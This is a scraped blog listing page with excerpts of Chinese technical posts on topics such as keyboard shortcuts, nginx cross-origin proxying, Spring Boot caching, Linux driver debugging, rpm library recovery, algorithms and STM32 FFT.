https://download.qt.io/archive/online_installers/3.2/
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ab470f273d6e9d84aa4c2c2382d6a24f/" rel="bookmark">
			台式电脑键盘按键错乱_Windows 电脑键盘右侧的九个按键有哪些功能？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用键盘时
右侧方向键上方的九大按键中
你是否有使用过？
prtsc是PrintScreenSysrq的缩小
简称截屏键
只要轻轻按下Prtsc键
它会截取电脑全屏
在按下Ctrl+v粘贴，即可把刚刚截的图显示出来
当然如果你是win10系统
可以按下win+shift+s
即可快速调出截图工具
ScrLK全名Scroll Lock
屏幕滚动显示锁定键
按下该键，暂时锁定屏幕
以便查看屏幕显示的信息
通常用于word和Excel表格中
当按下了Scroll Lock键后
就不会移动这个选定的单元格了
Pause既Pause Break键
中断暂停键
它的功能是实现程序在执行过程当中的暂停操作或者是终止操作
pause键使用是有局限的
使用它中断暂停的程序必须是特定的
可以按下win+pause
快速打开系统属性窗口
它的功能是将插入和覆盖之间切换
插入模式：文字向后挤
覆盖模式：后面的文字会被覆盖
他还有一个神器的功能
使用Shift+insert
可以做到粘贴操作
Delete键
与我们常用的Backspase不同的是
Delete是删除光标后的字符
而Backspase是删除前面的字符
它还可以删除文件
按下Shift+Delete实现永久删除
Home、End键
在一排文字当中
按下End键
可以快速定位到结尾
按下Home键
回到了开头
当然你还可以这样用
按下shift+end键
可以快速选择这段内容
而在浏览器中
按下End键
可以快速移动到结尾
按下home
回到顶部位置
剩下PageUP和PageDown键
他们可以做到上下滚动，上下翻页
与方向键上下类似
​在一个完整的页面时
它是上下翻页功能
关注黑白黑白办公公众号
学习更多小技巧
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8fb74b96a59837d4958e2fecaa482473/" rel="bookmark">
			oracle启动监听程序报错：本地计算机上的oracleOraDB11g_home1TNSListener服务启动后停止某些服务在未由其他服务或程序使用时将自动停止
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今晚启动oracle的监听程序服务时候报了个错误：本地计算机上的oracleOraDB11g_home1TNSListener服务启动后停止某些服务在未由其他服务或程序使用时将自动停止，如下图：
排查了一会发现其实是本地的ip地址变了，而oracle的监听程序配置文件里面配置的IP还是以前的IP，导致监听程序无法改变。
我们在oracle安装目录下面找到：listener.ora，把对应的IP地址改过来即可，
注意，要想把oracle服务启动起来，同目录下面的tnsnames.ora的IP也要改过来。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6bf317f7b899066d2375f2497ca314fc/" rel="bookmark">
			什么是跨域？如何解决？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是跨域？ 跨域：指的是浏览器不能执行其他网站的脚本。它是由浏览器的同源策略造成的，是浏览器对javascript施加的安全限制。
例如：a页面想获取b页面资源，如果a、b页面的协议、域名、端口、子域名不同，所进行的访问行动都是跨域的，而浏览器为了安全问题一般都限制了跨域访问，也就是不允许跨域请求资源。注意：跨域限制访问，其实是浏览器的限制。理解这一点很重要！！！
同源策略：是指协议，域名，端口都要相同，其中有一个不同都会产生跨域；
二、跨域访问示例 假设有两个网站，A网站部署在：http://localhost:81 即本地ip端口81上；B网站部署在：http://localhost:82 即本地ip端口82上。现在A网站的页面想去访问B网站的信息，A网站页面的代码如下（这里使用jquery的异步请求）
$(function (){
$.get("http://localhost:82/api/values", {},function (result) {
$("#show").html(result);
})})；
从错误信息可以看出以上出现了跨域问题！
三、如何解决跨域问题？ 由之前的介绍我们已经知道错误的原因，既然跨域会产生问题，那么我们就不跨域不就完了嘛！！！
先上图：
首先我们用nginx作为代理服务器和用户交互，这样用户就只需要在80端口上进行交互就可以了，这样就避免了跨域问题，因为我们都是在80端口上进行交互的；
下面我们看一下利用nginx作为反向代理的具体配置：
server {
listen 80; #监听80端口，可以改成其他端口
server_name localhost; # 当前服务的域名
#charset koi8-r;
#access_log logs/host.access.log main;
location / {
proxy_pass http://localhost:81;
proxy_redirect default;
}
location /apis { #添加访问目录为/apis的代理配置
rewrite ^/apis/(.*)$ /$1 break;
proxy_pass http://localhost:82;
}
#以下配置省略
1.当用户发送localhost:80/时会被nginx转发到http://localhost:81服务；
2.当界面请求接口数据时，只要以/apis 为开头，就会被nginx转发到后端接口服务器上；
总结：nginx实现跨域的原理，实际就是把web项目和后端接口项目放到一个域中，这样就不存在跨域问题，然后根据请求地址去请求不同服务器（真正干活的服务器）；
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5dedef0a5245885121c80f987c0f7f79/" rel="bookmark">
			数据结构_C语言_串_串的置换操作Replace (&amp;S, T, V)的算法、字符串反序的递推或递归算法，例如字符串为“abcsxw”，反序为“wxscba”、串的模式匹配算法及改进KMP算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 串的定义：串（字符串）是由零个或多个字符组成的有限序列。
对于串的基本操作集可以有不同的定义方式，对于串类型的最小操作子集有
串赋值串比较求串长串联接求子串 是最基本的操作子集，其他串操作都可以在这些操作上实现
串的表示和实现
串有3种机内表示方法
顺序存储结构
定长顺序存储表示（按照预定义的大小开辟一段连续的存储单元）堆分配存储表示（也是地址连续的一段存储空间，只不过是根据使用需求动态分配的） 链式存储结构
串的块链存储表示（多个字符共用一个节点，密度大） 目录 串的定长存储实现串的堆分配表示一些串操作的算法 串的置换串的递归反序串的模式匹配算法串的模式匹配算法改进版KMP 开始 一、串的定长存储实现 直接上代码，很容易理解
需要注意的地方：
SString是一种自定义的结构类型，其中能存放unsigned char 类型的元素规定一般字符数组的s[0] 存放字符串的长度lemgth至于为什么是255，因为无符号数的范围为 0 - 255，其实底层存储的还是ASCII码（一串01的代码），归根结底还是字节，万物皆字节 #include&lt;iostream&gt; #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; using namespace std; //串的定长顺序存储表示 //char 在c语言中站1个字节，2^8 - 1 = 255 #define MAXSTRLEN 255 //规定字符数组的s[0]存放子符串的长度，这其实也就是字符串底层实现的原理 //自定义数据类型 SString typedef unsigned char SString[MAXSTRLEN + 1] ; int main(){ SString s = "abcde"; cout&lt;&lt;s&lt;&lt;endl; cout&lt;&lt;"=================" &lt;&lt;endl&lt;&lt;endl; SString s1; cout&lt;&lt;"未赋初值的时候，存放的默认为："&lt;&lt;s1[0]&lt;&lt;endl&lt;&lt;endl; cout&lt;&lt;"=================" &lt;&lt;endl&lt;&lt;endl; //当然这里可以不进行长度的输入，直接s[0]就存放有效字符 cout&lt;&lt;"请输入这个新的字符串(第一位为字符串的长度)："&lt;&lt;endl; cin&gt;&gt;s1; cout&lt;&lt;"这个字符串为："; int i = 1; while(s1[i] !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5dedef0a5245885121c80f987c0f7f79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/741a1bc8b9f940d76c6d4217afe5b69a/" rel="bookmark">
			在linux下调试oled12864显示屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过i2c方式在linux3.10下调试oled12864显示屏
调试步骤：
1、确认硬件
1.1、确认硬件连接是spi还是i2c（本文采用的是通过i2c方式）。
1.2、检查硬件是否有肉眼可见的问题（虚焊或脱落）。
2、修改驱动代码
2.1、在drivers/video下选择合适的驱动代码（仅仅是找个驱动框架，也可以自己写），并在dts的对应i2c中添加对应的内容。
2.2、参考中景园中51单片机的代码，借用里面初始化代码和read、write函数，并在linux3.10下驱动代码中实现这些功能。
2.3、调通关键是i2c是否能读到设备地址的内容，如果能读到即代表完成了80%。
2.4、实现应用层需要调用驱动的接口。
2.5、写应用测试程序来验证屏幕能否正常显示。
本人调试遇到问题：
1、主控通过i2c不能读到oled屏设备内容，而且不断发送无法响应
分析：
1.1、检查是否有设备节点生成。
1.2、在i2c发送数据前将发送内容打印出来，确认发送内容是否存在问题。
1.3、通过示波器测量时钟信号和数据信号查看是否能测出来，并查看高低电平的值是多少。
1.4、前面3种办法无法查出问题，可以通过代码实现发送指定内容，然后在屏设备这边用逻积分析仪查看内容是否一致。
通过分析得知主控发送到oled的电压高低电平是0V和1.8V，但oled屏需要0V和3.3V才能驱动，所以硬件修改了下，然后就可以读到内容了。
参考博客：
https://blog.csdn.net/qq_33553024/article/details/84783587
附代码：（代码测试可用）
dts：
ssd1307: oled@3c {
compatible = “solomon,ssd1307fb-i2c”; reg = &lt;0x3c&gt;; reset-gpios = &lt;&amp;gpio2 GPIO_A10 5&gt;;
};
drivers：
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
#include &lt;linux/i2c.h&gt;
#include &lt;linux/fb.h&gt;
#include &lt;linux/uaccess.h&gt;
#include &lt;linux/of_device.h&gt;
#include &lt;linux/of_gpio.h&gt;
#include &lt;linux/pwm.h&gt;
#include &lt;linux/delay.h&gt;
#define SSD1307FB_WIDTH 128
#define SSD1307FB_HEIGHT 64
#define SSD1307FB_DATA 0x40
#define SSD1307FB_COMMAND 0x00
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/741a1bc8b9f940d76c6d4217afe5b69a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51e2648cd473636a59da7df294b5cde2/" rel="bookmark">
			数理统计基础 统计量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 https://blog.csdn.net/weixin_45792450/article/details/109314584
统计量由来与定义 如前所述，在进行统计推断时，构造样本的适当函数是关键，一个好的表达式，可以更方便研究总体的未知分布及相关性质。
为此，我们给出下列定义.
定义：设 ( X 1 , X 2 , . . . , X n ) ({X_1},{X_2},...,{X_n}) (X1​,X2​,...,Xn​)为总体 X {X} X的一个样本，称此样本的任一不含总体分布未知参数的函数为该样本的统计量。
举例说明：设总体 X {X} X服从正态分布， E ( X ) = 5 {E(X)=5} E(X)=5, D ( X ) = σ 2 D(X) = {\sigma ^2} D(X)=σ2, σ {\sigma} σ未知。 ( X 1 , X 2 , . . . , X n ) ({X_1},{X_2},...,{X_n}) (X1​,X2​,...,Xn​)为总体 X {X} X的一个样本，令：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51e2648cd473636a59da7df294b5cde2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16d302904fa576a9e06695c6331eb50f/" rel="bookmark">
			更改控件字体和字号
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这个是在一个讨论里面找到的，还是可以用的。
具体可以看代码
//设置字体参数 LOGFONT LogFont; ::memset(&amp;LogFont, 0, sizeof(LOGFONT)); lstrcpy(LogFont.lfFaceName,TEXT ("宋体"));//具体名称可查C:\WINDOWS\Fonts LogFont.lfWeight = 400;//字体线条宽度 LogFont.lfHeight = 20;//字体大小 LogFont.lfCharSet = 134;//字符集 LogFont.lfOutPrecision = 3;//字体精确度 LogFont.lfClipPrecision = 2;//裁剪字符办法 LogFont.lfOrientation = 45;//字符本身旋转的角度 LogFont.lfQuality = 1; LogFont.lfPitchAndFamily = 2;//字体的字符间距和族 // 创建字体 HFONT hFont = CreateFontIndirect(&amp;LogFont); // 设置控件字体 ::SendMessage(hWinRich, WM_SETFONT, (WPARAM)hFont, 0); 注：此博客目的只是为了方便大家，没有其他任何。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f109c0e62eb3b30bf741c788f7b698cd/" rel="bookmark">
			Spring Boot缓存注解介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring Boot缓存注解介绍 1. @EnableCaching注解2. @Cacheable注解@Cacheable注解相关属性 3. @CachePut注解4. @CacheEvict注解5. @Caching注解6. @CacheConfig注解。 本文介绍在使用Spring缓存时，所应用到的一些注解和相对应的属性，并对其相关功能进行较为详细的介绍。 1. @EnableCaching注解 @EnableCaching是由spring框架提供的，SpringBoot矿建对该注解进行了继承。该注解需要配置在类上(一般配置在SpringBoot启动类啥葛)，用于开启经济与注解的缓存支持。
@EnableCaching //SpringBoot开启缓存注解支持 @SpringBootApplication public class DemoApplication { public static void main(String[] args) { ConfigurableApplicationContext app = SpringApplication.run(DemoApplication.class, args); } 2. @Cacheable注解 @Cacheable注解也是由spring框架提供，可用作于类或方法上（通常用在数据查询方法上），对方结果进行缓存存储。@Cacheable注解的执行顺序时先进性缓存查询，如果为空则进行方法查询，并将结果进行缓存，如果缓存中有数据，不进行方法查询，而是直接使用缓存数据。
@Cacheable注解相关属性 value/cacheNames：指定缓存空间的名称，比配属性。可二选一使用。key：指定缓存中数据的key，默认使用方法参数值，也可使用SPEL表达式。keyGenerator：指定缓存数据的key的生成器，与key属性二选一使用。cacheManager：指定缓存的管理器cacheResolver：指定缓存的解析器，与cacheManager属性二选一使用。condition：指定在符合某种条件下，进行数据缓存。unless：指定在符合某种条件下不进行数据缓存。sync：指定是否使用异步缓存，默认为false。 3. @CachePut注解 @CachePut 注解是由Spring框架提供的，可以作用于类或方法（通常用在数据更新方法上)，该注解的作用是更新缓存数据。@CachePut注解的执行顺序是，先进行方法调用，然后将方法结果更新到缓存中。
@CachePut 注解也提供了多个属性，这些属性与@Cacheable注解的属性完全相同。
4. @CacheEvict注解 @CacheEvict 注解是由 Spring框架提供的，可以作用于类或方法（通常用在数据删除方法上)，该注解的作用是删除缓存数据。@CacheEvict注解的默认执行顺序是，先进行方法调用，然后将缓存进行清除。
@CacheEvict注解也提供了多个属性，这些属性与@Cacheable注解的属性基本相同，除此之外，还额外提供了两个特殊属性allEntries和beforeInvocation。
allEntries_属性:
allEntries属性表示是否清除指定缓存空间中的所有缓存数据，默认值为false(即默认只删除指定key对应的缓存数据)。例如@CacheEvict(cacheNames = “comment” allEntries = true)表示方法执行后会删除缓存空间comment中所有的数据。beforeInvocation 属性:
beforeInvocation属性表示是否在方法执行之前进行缓存清除，默认值为 false(即默认在执行方法后再进行缓存清除)。例如@CacheEvict(cacheNames = “comment”, beforeInvocation = true)表示会在方法执行之前进行缓存清除。需要注意的是，如果将@CacheEvict注解的 beforeInvocation属性设置为true，会存在一定的弊端。例如在进行数据珊除的方法中发生了异常，这会导致实际数据并没有被删除，但是缓存数据却被提前清除了。 5. @Caching注解 @Caching注解用于针对复杂规则的数据缓存管理，可以作用于类或方法，在@Caching注解内部包含有Cacheable、put和evict三个属性，分别对应于@Cacheable、@CachePut和@CacheEvict三个注解，示例代码如下。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f109c0e62eb3b30bf741c788f7b698cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/046a899ee7a6ec88d370211a518c9e80/" rel="bookmark">
			算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		算法 提示：这里可以添加本文要记录的大概内容：
例如：随着人工智能的不断发展，机器学习这门技术也越来越重要，很多人都开启了学习机器学习，本文就介绍了机器学习的基础内容。
提示：以下是本篇文章正文内容，下面案例可供参考
一、knn 代码如下（示例）：
# KNN近邻分类 # 随机抽取1/2的样本作为训练集，另外一半的样本作为测试集来验证模型的效果 iris1&lt;-iris set.seed(1234) # 利用caret包的createDataPartition函数按不同类别等比例抽取50% library(caret) ind &lt;- createDataPartition(iris1$Species,times=1,p=0.5,list=F) traindata &lt;-iris1[ind,] #构建训练集 testdata &lt;- iris1[-ind,] #构建测试集 # 利用class包中的knn函数对测试集的分类进行预测。 library(class) a=knn(traindata[,1:4],testdata[,1:4],traindata[,5],k=3) #指定k值为3 a[1];a[75] # 查看第一条和最后一条测试数据的预测结果 # KNN算法流程验证： ceshi &lt;- function(n=1,k=3){ # 计算第n个测试集样本与训练集样本的距离 x &lt;- (traindata[,1:4]-testdata[rep(n,75),1:4])^2 traindata$dist1 &lt;- apply(x,1,function(x) sqrt(sum(x))) # 对距离进行升序排序，选择最近的K个邻居 mydata &lt;- traindata[order(traindata$dist1)[1:k],5:6] # 统计不同类别的频数 result &lt;- data.frame(sort(table(mydata$Species),decreasing = T)) # 给出最后的预测结果 return(result[1,1]) } ceshi() # 第一个样本的预测结果 ceshi(n=75) # 最后一个样本的预测结果 二、朴素贝叶斯 代码如下（示例）：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/046a899ee7a6ec88d370211a518c9e80/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb5d135d86917e26006940c559986cab/" rel="bookmark">
			c lib rdkafka接口说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、主要数据结构 1、typedef struct rd_kafka_conf_s rd_kafka_conf_t;
rd_kafka_conf_t是kafka的全局配置结构，通过rd_kafka_conf_new()创建，创建时即进行了默认配置，通过rd_kafka_conf_set()设置参数值，是rd_kafka_new()创建kafka处理句柄的第二个参数，是必须创建的结构。
2、typedef struct rd_kafka_topic_conf_s rd_kafka_topic_conf_t;
rd_kafka_topic_conf_t主题配置结构，通过rd_kafka_topic_conf_new()创建，创建时即进行了默认配置，通过rd_kafka_topic_conf_set()设置参数值，是必须创建的结构。
3、typedef struct rd_kafka_s rd_kafka_t;
rd_kafka_t 是kafka 处理句柄结构，分为producer类型和consumer类型，由rd_kafka_new()第一个参数类型决定。rd_kafka_t是一个总体结构，conf和topic_conf都是为此结构服务，其中包含rk_brokers链表，rk_topics链表，是必须创建的结构。
4、typedef struct rd_kafka_topic_partition_list_s rd_kafka_topic_partition_list_t；
rd_kafka_topic_partition_list_t 可扩展长度的 主题-分区 链表，通过rd_kafka_topic_partition_list_new()创建，创建时指定长度，通过rd_kafka_topic_partition_list_add()添加 主题-分区对，用于订阅消息。
二、主要接口 1、rd_kafka_conf_t *rd_kafka_conf_new (void)
参数：无
返回值：rd_kafka_conf_t *
创建一个kafka全局配置结构，并进行默认初始化设置，返回其引用指针。
2、rd_kafka_conf_res_t rd_kafka_conf_set (rd_kafka_conf_t *conf,
const char *name,
const char *value,
char *errstr, size_t errstr_size)
参数：
conf：配置结构
vame：配置项名称
value：配置项值
errstr：错误提示
errstr_size：错误提示长度
返回值：rd_kafka_conf_res_t 枚举，错误写入errstr中
name具体的名称及作用见rd_kafka_properties 中_RK_GLOBAL类型的数据定义。调用这个函数后再调用rd_kafka_conf_set_default_topic_conf()会将之前设置的值全部用默认值覆盖掉。因为错误提示会写入errstr中，所以提前给errstr分配512字节空间。
bootstrap.servers
3、rd_kafka_topic_conf_t *rd_kafka_topic_conf_new (void)
参数：无
返回值：rd_kafka_topic_conf_t *
创建一个主题配置结构，并进行默认初始化设置，返回其引用指针。
4、rd_kafka_conf_res_t rd_kafka_topic_conf_set (rd_kafka_topic_conf_t *conf,
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb5d135d86917e26006940c559986cab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e579efd37b3867e3e2184680b81f80bf/" rel="bookmark">
			rpm:error while loading shared libraries: libz.so.1: cannot open shared object file:（问题解决）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		rpm:error while loading shared libraries: libz.so.1: cannot open shared object file: No such file or directory
由于要服务器中zlib版本，但rpm安装时会提示版本冲突，于是手贱rpm -e --nodeps zlib强制将zlib，
然而再执行rpm安装zlib-1.2.7-18.el7.x86_64时提示了错误：
rpm:error while loading shared libraries: libz.so.1: cannot open shared object file: No such file or directory
今天在这里记录一下问题解决的流程
解决方案有：
1、可以从同一版本系统中拷贝/usr/lib64/下的libz.so.1.2.7和libz.so.1到U盘中，U盘挂载到服务器中再进行拷贝恢复
查看磁盘分区名
fdisk -l 挂载U盘到/mnt目录下
mount /dev/*** /mnt/ 然后复制libz.so.1.2.7和libz.so.1到/usr/lib64/下
卸载U盘
umount /dev/*** 2、进入单用户模式从内核中复制
开机到选择系统界面时按e，找到出现“ro”的一行将 “ro” 替换成rw init=/sysroot/bin/sh
在下面这个页面按e
替换后
按Ctrl + X进入单机模式
进入lib64
直接从/lib64目录复制libz.so.1.2.7和libz.so.1到/sysroot/usr/lib64/下
cp /lib64/libz.so.1.2.7 /sysroot/usr/lib64/
或者cp libz.so.1.2.7 /sysroot/usr/lib64/
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e579efd37b3867e3e2184680b81f80bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/940725c2d401a522dd72ab43bd63aa19/" rel="bookmark">
			LeetCode题库 107. 二叉树的层次遍历 II
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		给定一个二叉树，返回其节点值自底向上的层次遍历。 （即按从叶子节点所在层到根节点所在的层，逐层从左向右遍历）
例如：
给定二叉树 [3,9,20,null,null,15,7],
3
/ \
9 20
/ \
15 7
返回其自底向上的层次遍历为：
[
[15,7],
[9,20],
[3]
]
代码：
/** * Definition for a binary tree node. * public class TreeNode { * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) { val = x; } * } */ class Solution { public List&lt;List&lt;Integer&gt;&gt; levelOrderBottom(TreeNode root) { LinkedList&lt;List&lt;Integer&gt;&gt; result=new LinkedList&lt;&gt;();//建立空链表 if(root==null) return result;// Queue&lt;TreeNode&gt; q=new LinkedList&lt;&gt;(); q.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/940725c2d401a522dd72ab43bd63aa19/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/371ea77601087b2177c7c53a6a99c0ef/" rel="bookmark">
			AcWing算法基础课（一）基础算法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1.1 排序1.2 二分搜索1.3 高精度1.4 前缀和与差分1.5 双指针算法1.6 位运算1.7 离散化1.8 区间合并 1.1 排序 快速排序归并排序 快速排序（不稳定的排序）
分治思想
步骤（对左边界为l，右边界为r的一段数进行排序）：
确定分界点：q[l], q[(l + r) / 2], q[r], 随机值调整区间（重点）：通过x对区间进行划分，使得左边区间都≤x，右边区间都≥x（左右区间不一定相等）递归处理左右两个区间 调整区间的方式：
设置两个指针i，j分别指向区间的左右两个元素i指针向右移动，直至其指向的元素≥x，停下j指针向左移动，直至其指向的元素≤x，停下交换i，j所指向的元素（两个指针分别向中间移动一位）若i和j相遇，结束；否则跳至步骤2 一个模板：
void quick_sort(int q[], int l, int r) { if (l &gt;= r) return; int i = l - 1, j = r + 1, x = q[l + r &gt;&gt; 1]; while (i &lt; j) { do i ++ ; while (q[i] &lt; x); do j -- ; while (q[j] &gt; x); if (i &lt; j) swap(q[i], q[j]); } quick_sort(q, l, j), quick_sort(q, j + 1, r); } 代码解释：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/371ea77601087b2177c7c53a6a99c0ef/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de0fac212977f253332425ae7447c85f/" rel="bookmark">
			STM32 FFT DMA ADC THD
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用STM32 FFT算法计算THD 一、设备准备 ——&gt;粤嵌STM32F429IGT6开发板 1块
——&gt;串口调试助手
二、FFT算法意义 使用FFT算法，是为了获取信号在频域的相关参数，即信号的频谱。包括信号在频谱上各点的频率和该点的幅值。
由上面的调制信号和已调信号的频谱图，我们可以观察到正弦信号在未经过调制前，其频谱图仅仅在0频附近有一条谱线，这条谱线即为未调制信号的频谱。同时，我们可以观察到调制后的正弦信号的频谱发生了搬移，即从零频附近搬移到载波信号的频谱处。
首先让我们理解一个概念，信号的组成：任何连续测量的时序或信号，都可以表示为不同频率的正弦波信号的无限叠加。而根据该原理创立的傅立叶变换算法利用直接测量到的原始信号，以累加方式来计算该信号中不同正弦波信号的频率、振幅和相位。
其实，简单的理解，观察信号的角度从时域转换到频域，对观察者最大的好处是：在频域，信号的频谱图能够反映该信号所含的各种频率成分的信号及它们的幅值。
傅里叶级数的意义
三、DSP实际使用方法 我们使用ST公司提供的DSP库中的FFT算法。
使用步骤如下：
- STM32F4 DSP简介
STM32F4采用Cortex-M4内核，相比Cortex-M3系列除了内置硬件FPU单元（浮点运算单元)，FPU是专用于浮点运算的处理器，在数字信号处理方面还增加了DSP指令集，支持诸如单周期乘加指令（MAC），优化的单指令多数据指令(SIMD)，饱和算数等多种数字信号处理指令集。Cortex-M4执行所有的DSP指令都可以在单周期内完成，而Cortex-M3需要多个指令和多个周期才能完成同样的功能。
- 下载DSP_Lib源码包
找到DSP_Lib源码包，该文件夹目录结构如下图所示：
DSP_Lib源码包的Source文件夹是所有DSP库的源码，Examples文件夹是相对应的一些测试实例。这些测试实例都是带main函数的，也就是拿到工程中可以直接使用。
查阅原子STM32F4开发指南-寄存器版本，P699页，了解各种源码的功能介绍。
- 搭建DSP运行环境
只要DSP库运行环境搭建好了，使用DSP库里面的函数来做相关处理就非常简单。在MDK里面搭建STM32F4的DSP运行环境(使用.lib方式)是很简单的，分为3个步骤：
1、添加文件
在例程工程目录下新建：DSP_LIB文件夹，存放要添加的arm_correxM4lf_math.lib和相关头文件。
打开工程，新建DSP_LIB分组，并将arm_cortexM4lf_math.lib添加到工程里面。
如上面两图所示，这样添加文件就结束了。
2、添加头文件包含路径。
添加好了.lib文件后，我们要添加头文件包含路径，将第一步拷贝的Include文件夹和DSP_LIB文件夹，加入头文件包含路径，如下图所示。
3.添加全局变量宏
注意：这里两个宏之间用“,”隔开。这里我添加的宏包括：USE_STDPERIPH_DRIVER,STM32F429_439xx,ARM_MATH_CM4,__CC_ARM,ARM_MATH_MATRIX_CHECK,ARM_MATH_ROUNDING，如果没有在Target选项卡设置Code Generation选择use FPU,则必须在此处手动添加_FPU_USED。
这样，STM32F4DSP库运行环境就搭建完成了。
四、代码介绍 我采用在时域对信号进行采样，将时域采样数据进行4096点FFT变换，得到信号各频率成分的幅值，最后计算该信号的THD。
1.DMA介绍
DMA： 全称为： Direct Memory Access，即直接存储器访问。 DMA 传输方式无需 CPU 直接控制传输，也没有中断处理方式那样保留现场和恢复现场的过程，通过硬件为 RAM 与 I/O 设备开辟一条直接传送数据的通路， 能使 CPU 的效率大为提高。
STM32 最多有 2 个 DMA 控制器（DMA2 仅存在大容量产品中）， DMA1 有 7 个通道。 DMA2 有 5个通道。每个通道专门用来管理来自于一个或多个外设对存储器访问的请求。还有一个仲裁起来协调各个 DMA 请求的优先权。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de0fac212977f253332425ae7447c85f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4842f383c1e62d15fc88c60d5d6a6991/" rel="bookmark">
			图像/视频超分之降质过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击上方“计算机视觉工坊”，选择“星标”
干货第一时间送达
图像/视频超分领域近期并无突破性的方法出现，故近期计划将图像/视频超分相关方法进行一次综述性汇总。计划从不同点出发对图像/视频超分进行一次“反思”之旅。本文是该旅程的第一站：图像降质过程。
尽管图像超分和视频超分在方法上或多或少会有一些关键性的区别，但是两者在训练数据对的制作方面其实并无非常大的区别。所以本文主要以图像超分为例进行介绍。
说到图像超分，大家可能会很自然的想到这样几个数据集：DIV2K，Set5，Set14等等。确实，这些数据集都是图像超分领域最常见的数据集。我们先来简单汇总一下图像/视频超分领域有哪些公开数据集。
NamePhaseSet5testSet14testB100testMenga109testUrban100testGeneral100testL20testDIV2Ktrain/valDIV8Ktrain/valFlickr2KtrainDF2K(DIV2K+Flickr2K)trainCity100train/valDRealSRtrain/valRealSR(V1, V2, V3)train/valAogra(声网)trainVid4testSPMCstestUDM10testMM522trainREDStrain/valVimeotrain/valYoukutrain 注：上面所列出的仅是图像/视频超分的常用数据集以及部分竞赛数据集，除此之外还有一些Real-World数据集。其中DIV2K当属图像超分领域应用最多的一个数据集，它也是目前图像超分最常用的一个训练数据集(部分模型会考虑采用DF2K进一步提升模型性能，比如AIM2020-Efficient SuperResolution中的方法都采用了DF2K进行模型训练)；REDS与Vimeo是视频超分领域应用最多的两个训练数据集(REDS是NTIRE2019竞赛中引入的一个数据集)；RealSR、DRealSR是两个真实场景采集的图像超分数据集(具体怎样构建的训练数据对后期有空会介绍一下)。
尽管有了上述数据集，那么训练数据对LR-HR是如何构建的呢？
原理 对于图像超分而言，LR图像的获取过程一般可以描述为：
其中，k表示降质模糊核(它有多种选择，比如双三次核、高斯核等)， 表示下采样，n表示加性高斯白噪声。
可以看到上述降质过程包含模糊、下采样以及噪声，而图像超分则仅仅考虑了模糊核下采样。我们就来对可能的降质过程做一个简单的归纳，见下表。
类型说明BIbicubic-downBDblur-downBNbicubic-down+noiseDNblur-down+noise 注：BI表示降质过程仅包含双三次下采样；BD表示通过高斯模糊下采样；BN表示双三次插值下采样+高斯白噪声；DN表示高斯模糊下采样+高斯白噪声。
